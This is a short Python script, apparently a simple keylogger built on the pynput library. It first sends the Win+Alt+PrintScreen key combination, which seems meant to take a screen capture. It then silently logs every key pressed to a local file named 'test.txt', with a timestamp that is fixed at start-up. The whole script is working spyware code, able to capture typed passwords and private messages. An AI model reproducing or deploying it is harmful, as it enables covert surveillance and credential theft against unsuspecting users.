from pynput.keyboard import Key,Listener
from pynput.mouse import Controller
import pynput.keyboard as pk
import pynput.mouse as pm
import logging
import time

keyboard=pk.Controller()

keyboard.press(Key.cmd)
keyboard.press(Key.alt_l)
keyboard.press(Key.print_screen)

keyboard.release(Key.cmd)
keyboard.release(Key.alt_l)
keyboard.release(Key.print_screen)

logging.basicConfig(filename='test.txt',level=logging.DEBUG)
timer=time.asctime()

def when_press(Keu):
    logging.info(str(Keu))
    logging.debug(str(timer))
    logging.debug(str("\n"))
    
with Listener(on_press=when_press) as listner:
    listner.join(timeout=None)